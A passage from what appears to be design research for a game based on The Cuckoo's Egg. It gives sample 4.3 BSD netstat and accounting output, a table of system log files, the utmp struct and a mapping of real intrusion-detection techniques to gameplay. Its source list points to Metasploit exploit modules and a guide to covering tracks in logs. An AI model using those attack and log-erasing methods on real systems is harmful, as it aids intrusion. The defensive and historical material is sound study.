Proto  Recv-Q Send-Q  Local Address          Foreign Address        (state)
tcp         0      0  128.3.254.19.23        192.168.42.1.4523      ESTABLISHED
tcp         0      0  128.3.254.19.25        *.*                    LISTEN
tcp         0      0  128.3.254.19.79        *.*                    LISTEN
tcp         0      0  128.3.254.19.21        *.*                    LISTEN
tcp         0      0  128.3.254.19.23        *.*                    LISTEN
tcp         0      0  128.3.254.19.513       *.*                    LISTEN
tcp         0      0  128.3.254.19.514       *.*                    LISTEN
udp         0      0  128.3.254.19.514       *.*

$ netstat
Active Internet connections
Proto  Recv-Q Send-Q  Local Address      Foreign Address     (state)
tcp         0      0  lbl-csam.telnet    tymnet-still.4523   ESTABLISHED
```

### Accounting Commands

```
$ lastcomm sventek
emacs          sventek  ttyp2     0:45.38 Mon Aug 18 03:42
cat            sventek  ttyp2     0:00.02 Mon Aug 18 03:43
ls             sventek  ttyp2     0:00.04 Mon Aug 18 03:43
cat            sventek  ttyp2     0:00.01 Mon Aug 18 03:44
grep        F  sventek  ttyp2     0:00.12 Mon Aug 18 03:44
cp             sventek  ttyp2     0:00.08 Mon Aug 18 03:45
movemail    S  sventek  ttyp2     0:00.06 Mon Aug 18 03:46
sh          SF root     ??        0:00.02 Mon Aug 18 03:47
chmod       SF root     ??        0:00.01 Mon Aug 18 03:47

$ sa -m
                     stoll       12    0.08re    0.04cp     0avio     8k
                   sventek       47    2.14re    0.92cp     0avio    12k
                      root        8    0.03re    0.02cp     0avio     4k

$ ac -p
    stoll         24.50
    sventek        8.75
    root         120.00
    total        153.25
```

### Log Files on 4.3 BSD

| File | Purpose | Format | Read With |
|------|---------|--------|-----------|
| `/var/adm/wtmp` | Login/logout history | Binary (struct utmp) | `last` |
| `/var/run/utmp` | Current logins | Binary (struct utmp) | `who`, `w`, `finger` |
| `/var/adm/lastlog` | Last login per user | Binary (struct lastlog) | `lastlog`, `finger` |
| `/var/adm/acct` | Process accounting | Binary (struct acct) | `lastcomm`, `sa` |
| `/var/log/messages` | System messages | Text (syslog format) | `cat`, `grep`, `tail` |
| `/var/log/maillog` | Mail system logs | Text (syslog format) | `cat`, `grep` |
| `/var/adm/cron.log` | Cron job execution | Text | `cat`, `grep` |
| `/etc/passwd` | User accounts | Text (colon-delimited) | `cat`, `grep` |
| `/etc/hosts.equiv` | Host trust relationships | Text (hostname per line) | `cat` |
| `~/.rhosts` | User trust relationships | Text (host user per line) | `cat` |

### 4.3 BSD utmp Structure

```c
struct utmp {
    char ut_line[8];     /* tty name */
    char ut_name[8];     /* user name */
    char ut_host[16];    /* remote host */
    long ut_time;        /* login time */
};
```

Each record was 36 bytes. The BSD utmp structure was simpler than System V's -- it lacked a `ut_type` field, meaning dead/login entries could appear in `who` output.

---

## Summary: Gameplay Mechanic Mapping

| Real Technique | Gameplay Mechanic |
|---|---|
| `who` / `finger` / `last` | Player checks for suspicious logins, correlates times and sources |
| `lastcomm` / `sa` | Player reviews command history, spots SUID execution and unusual programs |
| `ps` / `netstat` | Player monitors active sessions and network connections in real-time |
| syslog review | Player reads log files for authentication failures, cron anomalies |
| `/etc/passwd` analysis | Player identifies accounts with weak or missing passwords |
| `.rhosts` / `hosts.equiv` audit | Player maps trust relationships, finds unauthorized entries |
| `find / -perm -4000` | Player discovers unauthorized SUID binaries (backdoors) |
| Alert scripts | Player writes/deploys monitoring scripts, earns passive detection |
| Printer/teletype monitoring | Player attaches session logger to capture hacker keystrokes |
| Honeypot files | Player creates bait files with enticing names/keywords |
| Pager alerts | Player upgrades to remote notification, enabling off-hours response |
| Network tracing | Player contacts Tymnet/Datex-P operators, keeps hacker online long enough |
| TCP Wrappers | Late-game upgrade: access control and connection logging |
| Password shadowing | Late-game upgrade: prevents offline password cracking |
| Process accounting | The 75-cent anomaly that starts the investigation |

---

## Sources

- [The Cuckoo's Egg (book) - Wikipedia](https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg_(book))
- [Markus Hess - Wikipedia](https://en.wikipedia.org/wiki/Markus_Hess)
- [Morris worm - Wikipedia](https://en.wikipedia.org/wiki/Morris_worm)
- [Emacs movemail Privilege Escalation - Rapid7](https://www.rapid7.com/db/modules/exploit/unix/local/emacs_movemail/)
- [Metasploit movemail module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/local/emacs_movemail.md)
- [Metasploit movemail PR #11049](https://github.com/rapid7/metasploit-framework/pull/11049)
- [The Ghost of Exploits Past: Morris Worm - Rapid7](https://www.rapid7.com/blog/post/2019/01/02/the-ghost-of-exploits-past-a-deep-dive-into-the-morris-worm/)
- [Morris Worm sendmail Debug Mode Shell Escape - Rapid7](https://www.rapid7.com/db/modules/exploit/unix/smtp/morris_sendmail_debug/)
- [fingerd Buffer Overflow - UC Davis Security Lab](https://seclab.cs.ucdavis.edu/projects/vulnerabilities/doves/1.html)
- [The Hack FAQ: Unix Passwords](https://www.nmrc.org/pub/faq/hackfaq/hackfaq-28.html)
- [passwd - Wikipedia](https://en.wikipedia.org/wiki/Passwd)
- [UNIX Co-Founder Ken Thompson's BSD Password Finally Cracked](https://thehackernews.com/2019/10/unix-bsd-password-cracked.html)
- [.rhosts - phoenixNAP Glossary](https://phoenixnap.com/glossary/rhosts)
- [The Ins and Outs of .rhosts - Computerworld](https://www.computerworld.com/article/2808563/the-ins-and-outs-of--rhosts.html)
- [TCP Wrapper: Network Monitoring, Access Control, and Booby Traps - Venema (USENIX 1992)](https://www.usenix.org/legacy/publications/library/proceedings/sec92/full_papers/venema.pdf)
- [TCP Wrappers - Wikipedia](https://en.wikipedia.org/wiki/TCP_Wrappers)
- [Catching up with Wietse Venema](https://www.postfix.org/linuxsecurity-200407.html)
- [Murphy's Law and Computer Security - Venema](https://insecure.org/stf/wietse_murphy.html)
- [RFC 3164 - The BSD Syslog Protocol](https://datatracker.ietf.org/doc/html/rfc3164)
- [utmp - Wikipedia](https://en.wikipedia.org/wiki/Utmp)
- [SANS: Unix Logging](https://www.sans.org/blog/unix-logging/)
- [Process Accounting: The acct/pacct File - O'Reilly](https://www.oreilly.com/library/view/practical-unix-and/0596003234/ch21s02.html)
- [GNU Accounting Utilities Manual](https://www.gnu.org/software/acct/manual/accounting.html)
- [tcpdump - Wikipedia](https://en.wikipedia.org/wiki/Tcpdump)
- [Van Jacobson - Internet Hall of Fame](https://www.internethalloffame.org/inductee/van-jacobson/)
- [Tymnet - Wikipedia](https://en.wikipedia.org/wiki/Tymnet)
- [X.25 - Wikipedia](https://en.wikipedia.org/wiki/X.25)
- [Phreaking - Wikipedia](https://en.wikipedia.org/wiki/Phreaking)
- [Blue box - Wikipedia](https://en.wikipedia.org/wiki/Blue_box)
- [Finger protocol - Wikipedia](https://en.wikipedia.org/wiki/Finger_(protocol))
- [UUCP - Wikipedia](https://en.wikipedia.org/wiki/UUCP)
- [How to Cover Your Tracks - ouah.org](http://www.ouah.org/cover_your_tracks1.html)
- [The Hack FAQ: Unix Logging](https://www.nmrc.org/pub/faq/hackfaq/hackfaq-31.html)
- [The Cuckoo's Egg Analysis - Medium (Jarred Carter)](https://medium.com/@jcart657/the-cuckoos-egg-9b502442ea67)
- [Honeypots: Weighing Costs and Benefits - GIAC/SANS](https://www.giac.org/paper/gsec/2300/honeypots-weighing-costs-benefits/103964)
- [4.3BSD and Metasploit - astr0baby](https://astr0baby.wordpress.com/2019/09/22/4-3bsd-and-metasploit/)
- [Phreaking 101 - Blue Goat Cyber](https://bluegoatcyber.com/blog/phreaking-101-the-history-and-evolution-of-hacking-telephone-networks/)
- [Kerberos Definition - TechTarget](https://www.techtarget.com/searchsecurity/definition/Kerberos)
